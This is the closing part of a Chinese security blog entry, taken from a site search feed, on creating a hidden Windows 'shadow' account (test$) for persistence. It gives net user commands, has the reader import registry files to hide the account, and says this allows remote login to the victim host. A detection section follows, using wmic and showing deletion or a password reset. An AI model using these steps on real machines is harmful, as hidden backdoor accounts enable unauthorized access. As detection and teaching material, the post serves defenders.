href="#删除隐藏用户，导入隐藏用户注册表" class="headerlink" title="删除隐藏用户，导入隐藏用户注册表"></a>删除隐藏用户，导入隐藏用户注册表</h3><p>将隐藏用户删除</p><pre class=" language-powershell"><code class="language-powershell">net user test$ <span class="token operator">/</span><span class="token function">del</span></code></pre><p>将<code>1.reg</code>和<code>2.reg</code>导入注册表（双击即可）</p><p>此时我们查看本地用户和组并未发现<code>test$</code>账户，但使用<code>net user test$</code>可以查看到说明我们影子用户添加完成</p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/9.png"></p><p>此时我们就实现权限维持，后续可以利用远程登录登入受害者主机</p><h1 id="排查方法"><a href="#排查方法" class="headerlink" title="排查方法"></a>排查方法</h1><p>利用<code>vmic</code>命令即可查到所有用户</p><pre class=" language-powershell"><code class="language-powershell">wmic useraccount get name<span class="token punctuation">,</span>sid</code></pre><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/10.png"></p><p>排查到以后可以将影子用户删除或者改密</p><pre class=" language-powershell"><code class="language-powershell">net user test$ <span class="token operator">/</span><span class="token function">del</span>net user test$ <span class="token punctuation">[</span>密码<span class="token punctuation">]</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 权限维持 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows后门 </tag>
            
            <tag> 权限维持 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
